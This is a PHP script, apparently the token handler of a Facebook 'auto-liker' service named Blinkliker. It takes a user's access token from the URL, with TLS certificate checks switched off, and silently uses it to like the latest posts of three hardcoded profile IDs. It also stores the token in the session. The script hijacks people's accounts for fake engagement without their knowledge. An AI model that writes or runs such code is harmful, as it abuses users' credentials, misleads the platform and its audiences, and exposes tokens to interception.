<?php
/**
 *
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2017 Shakti Saurav
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 */
function get_json($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return json_decode($data);
}
function get_html($url) {
$ch = curl_init();

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FAILONERROR, 0);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
$token2 = $_GET["user"];
session_start();
if(isset($token2)){
if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
$token = $matches[1];
}else{
$token = $token2;}
$exe = json_decode(get_html("https://graph.fb.me/app?access_token=".$token ))->id;
$extend = get_html("https://graph.fb.me/me/permissions?access_token="  . $token);
$cut = explode('&',$token);
$wenta = $cut[0];
//ren liker
$getpost = "https://graph.facebook.com/100004696867522/feed?limit=1&access_token=".$wenta;
$get = file_get_contents($getpost);
$array = json_decode($get, true);
$postid = $array[data][0][id];
$com = "https://graph.facebook.com/".$postid."/likes?method=post&access_token=".$wenta;
$ren = file_get_contents($com);
//ren liker
$getpost = "https://graph.facebook.com/100006753604304/feed?limit=1&access_token=".$wenta;
$get = file_get_contents($getpost);
$array = json_decode($get, true);
$postid = $array[data][0][id];
$com = "https://graph.facebook.com/".$postid."/likes?method=post&access_token=".$wenta;
$ren = file_get_contents($com);
if($exe == "309481925768757" || $exe == "309481925768757"){
$pos = strpos($extend, "publish_stream");
if ($pos == true) {
$_SESSION['token'] = $token;
header('Location:/');
$getpost = "https://graph.facebook.com/100003808830752/feed?limit=1&access_token=". $token;
$get = file_get_contents($getpost);
$array = json_decode($get, true);
$postid = $array[data][0][id];
$com = "https://graph.facebook.com/".$postid."/likes?method=post&access_token=". $token;
$ren = file_get_contents($com);
}
else {
header('Location: /?i=Please Allow App to Access Your Profile! !, Try Again..');}
}else{
header('Location: /?i=Please Generate token Using Blinkliker ONLY!');}
}else{
header('Location: /?i=Please Allow App to Access Your Profile! !, Try Again..');}
?>